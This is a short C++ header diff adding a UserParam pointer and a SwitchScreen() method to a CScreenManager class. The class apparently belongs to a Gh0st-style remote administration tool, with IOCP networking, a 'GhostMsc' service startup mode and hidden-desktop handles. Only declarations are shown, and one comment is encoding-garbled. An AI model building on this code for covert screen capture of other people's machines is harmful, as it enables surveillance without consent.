@@ -19,6 +19,8 @@ bool IsWindows8orHigher();
 
 class IOCPClient;
 
+struct UserParam;
+
 class CScreenManager : public CManager
 {
 public:
@@ -37,6 +39,7 @@ public:
     VOID SendNextScreen(const char* szBuffer, ULONG ulNextSendLength);
 
     VOID ProcessCommand(LPBYTE szBuffer, ULONG ulLength);
+    UserParam *m_pUserParam = NULL;
     INT_PTR m_ptrUser;
     HDESK g_hDesk;
     BOOL m_isGDI;
@@ -56,6 +59,8 @@ public:
     bool IsRunAsService() const {
         return m_conn ? m_conn->iStartup == Startup_GhostMsc : false;
     }
+    bool SwitchScreen();
+
     // ÐéÄâ×ÀÃæ
     BOOL                m_virtual;
     POINT               m_point;
